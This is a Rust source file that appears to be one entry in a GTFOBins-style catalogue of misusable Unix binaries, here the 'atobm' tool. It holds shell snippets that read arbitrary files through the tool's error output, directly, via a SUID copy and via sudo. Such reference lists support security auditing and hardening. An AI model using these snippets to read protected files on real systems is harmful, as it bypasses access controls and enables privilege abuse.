pub static BIN_NAME: &'static str = "atobm";
pub static BIN_DESC: &'static str = "Outputs the first line of the file to standard error without the `-` and `#` characters, this can be customized with the `-c` option, by default is `-c -#`.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which atobm) .

    LFILE=file_to_read
    ./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUID: Code<'static> = Code {
    title: "SUID_CODE",
    code: SUID_CODE,
    tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
